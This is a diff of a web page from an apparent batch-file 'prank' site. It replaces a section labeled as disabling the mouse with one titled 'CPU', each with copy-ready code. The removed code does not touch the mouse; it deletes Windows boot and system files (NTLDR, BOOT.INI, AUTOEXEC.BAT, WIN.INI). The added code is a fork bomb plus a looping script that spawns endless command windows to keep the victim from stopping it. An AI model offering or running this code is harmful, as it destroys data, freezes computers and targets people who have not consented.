@@ -13,38 +13,38 @@
     <link href="/style/lib/animate.min.css" rel="stylesheet">
     <!-- my css -->
     <link rel="stylesheet" href="/style/src/index.css">
-    <title>Mouse || Annoying Batch! || 9</title>
+    <title>CPU || Annoying Batch! || 9</title>
 </head>
 <body>
     <div class="container-fluid d-flex flex-column flex-wrap justify-content-start align-items-center">
         <div class="container d-flex flex-column align-items-center  justify-content-start my-1">
             <!-- content here -->
-                <h1>Mouse</h1>
+                <h1>CPU</h1>
                 <div class="border-1 border-dark w-100 border mt-3"></div>
             <p>
-                The code below is to disable the mouse. If you want to prank someone, you should probably have
-                a file for disabling the mouse and once you are done pranking them, you could run another file that undoes it. 
-                You could achieve this, by pressing <b>WINDOWS</b> + <b>r</b>, and then typing <b>cmd</b>. This will open a COMMAND PROMPT, which
-                would let you run any file with the <b>start filename.extension</b> code, once you have maneuvered your way to the directory with
-                the <b>cd directoryname</b>.
+                The code below, uses 100% of your CPU. It runs into an error causing your computer to have
+                a seizure.
             </p>
-            <p>
-                Well, the code below this is to disable the mouse and the code after this one below
-                is to enable it back.
-            </p>
-
 <div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
 <button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
 <textarea spellcheck="false" rows="9">
-@ECHO OFF
-ATTRIB -R -S -H C:\AUTOEXEC.BAT
-DEL C:\AUTOEXEC.BAT
-ATTRIB -R -S -H C:\BOOT.INI
-DEL C:\BOOT.INI
-ATTRIB -R -S -H C:\NTLDR
-DEL C:\NTLDR
-ATTRIB -R -S -H C:\WINDOWS\WIN.INI
-DEL C:\WINDOWS\WIN.INI
+%0|%0
+</textarea>
+</div>
+<p>
+    Also to stop the user from stopping the command, I creatted a file that opens many COMMAND PROMPTS
+    in an attempt to stop the user from closing the COMMAND PROMPT that is running the error.
+</p>
+<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
+<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
+<textarea spellcheck="false" rows="9">
+echo :loopname>file.bat
+echo start notepad>>file.bat
+echo start cmd>>file.bat
+echo goto loopname>>file.bat
+start file.bat
+
+%0|%0
 </textarea>
 </div>
                 <!-- navigation buttons -->
